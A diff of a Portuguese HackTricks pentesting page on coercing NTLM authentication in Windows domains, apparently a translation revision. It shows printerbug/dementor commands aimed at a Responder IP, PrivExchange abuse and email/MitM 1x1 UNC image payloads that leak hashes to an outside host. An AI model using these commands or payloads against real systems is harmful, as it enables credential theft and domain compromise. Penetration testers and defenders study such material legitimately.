@@ -2,11 +2,11 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
@@ -27,14 +27,14 @@ Usando o PowerShell, obtenha uma lista de máquinas Windows. Os servidores geral
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Encontrando serviços de spooler ouvindo
+### Encontrando serviços Spooler ouvindo
 
-Usando uma versão ligeiramente modificada do [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), verifique se o Serviço de Spooler está ouvindo:
+Usando uma versão ligeiramente modificada do [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), verifique se o Serviço Spooler está ouvindo:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-Você também pode usar o rpcdump.py no Linux e procurar pelo Protocolo MS-RPRN
+Você também pode usar o rpcdump.py no Linux e procurar pelo Protocolo MS-RPRN.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
@@ -49,9 +49,9 @@ ou use [**dementor.py** de 3xocyte](https://github.com/NotMedic/NetNTLMtoSilverT
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
-### Combinando com Delegação Irrestrita
+### Combinando com Delegação Não Restrita
 
-Se um atacante já comprometeu um computador com [Delegação Irrestrita](unconstrained-delegation.md), o atacante poderia **fazer a impressora autenticar-se neste computador**. Devido à delegação irrestrita, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação irrestrita. Como o atacante já comprometeu este host, ele será capaz de **recuperar este ticket** e abusá-lo ([Pass the Ticket](pass-the-ticket.md)).
+Se um atacante já comprometeu um computador com [Delegação Não Restrita](unconstrained-delegation.md), o atacante poderia **fazer a impressora autenticar-se neste computador**. Devido à delegação não restrita, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação não restrita. Como o atacante já comprometeu este host, ele será capaz de **recuperar este ticket** e abusá-lo ([Pass the Ticket](pass-the-ticket.md)).
 
 ## Autenticação Forçada RCP
 
@@ -59,9 +59,9 @@ Se um atacante já comprometeu um computador com [Delegação Irrestrita](uncons
 
 ## PrivExchange
 
-O ataque `PrivExchange` é resultado de uma falha encontrada no recurso **Exchange Server `PushSubscription`**. Este recurso permite que o servidor Exchange seja forçado por qualquer usuário de domínio com uma caixa de correio a autenticar-se em qualquer host fornecido pelo cliente via HTTP.
+O ataque `PrivExchange` é resultado de uma falha encontrada na **funcionalidade de `PushSubscription` do Exchange Server**. Esta funcionalidade permite que o servidor Exchange seja forçado por qualquer usuário de domínio com uma caixa de correio a autenticar-se em qualquer host fornecido pelo cliente via HTTP.
 
-Por padrão, o **serviço Exchange é executado como SYSTEM** e recebe privilégios excessivos (especificamente, possui **privilégios WriteDacl no domínio antes da Atualização Cumulativa de 2019**). Essa falha pode ser explorada para permitir o **encaminhamento de informações para o LDAP e, posteriormente, extrair o banco de dados NTDS do domínio**. Em casos em que o encaminhamento para o LDAP não é possível, essa falha ainda pode ser usada para encaminhar e autenticar em outros hosts dentro do domínio. A exploração bem-sucedida deste ataque concede acesso imediato ao Administrador de Domínio com qualquer conta de usuário de domínio autenticada.
+Por padrão, o **serviço Exchange é executado como SYSTEM** e possui privilégios excessivos (especificamente, possui **privilégios WriteDacl no domínio antes da Atualização Cumulativa de 2019**). Essa falha pode ser explorada para permitir o **encaminhamento de informações para o LDAP e, posteriormente, extrair o banco de dados NTDS do domínio**. Em casos onde o encaminhamento para o LDAP não é possível, essa falha ainda pode ser usada para encaminhar e autenticar-se em outros hosts dentro do domínio. A exploração bem-sucedida deste ataque concede acesso imediato ao Administrador de Domínio com qualquer conta de usuário de domínio autenticada.
 
 ## Dentro do Windows
 
@@ -87,17 +87,17 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-Se você conhece o **endereço de email** do usuário que faz login em uma máquina que você deseja comprometer, você poderia simplesmente enviar a ele um **email com uma imagem 1x1** como:
+Se você conhece o **endereço de e-mail** do usuário que faz login em uma máquina que deseja comprometer, você pode simplesmente enviar a ele um **e-mail com uma imagem 1x1** como:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
 ### MitM
 
-Se você conseguir realizar um ataque de MitM a um computador e injetar HTML em uma página que ele visualizar, você pode tentar injetar uma imagem como a seguinte na página:
+Se você conseguir realizar um ataque MitM a um computador e injetar HTML em uma página que ele visualizar, você pode tentar injetar uma imagem como a seguinte na página:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Quebra do NTLMv1
+## Quebrando o NTLMv1
 
 Se você conseguir capturar [desafios NTLMv1 leia aqui como quebrá-los](../ntlm/#ntlmv1-attack).\
 _Lembre-se de que, para quebrar o NTLMv1, você precisa definir o desafio do Responder como "1122334455667788"_
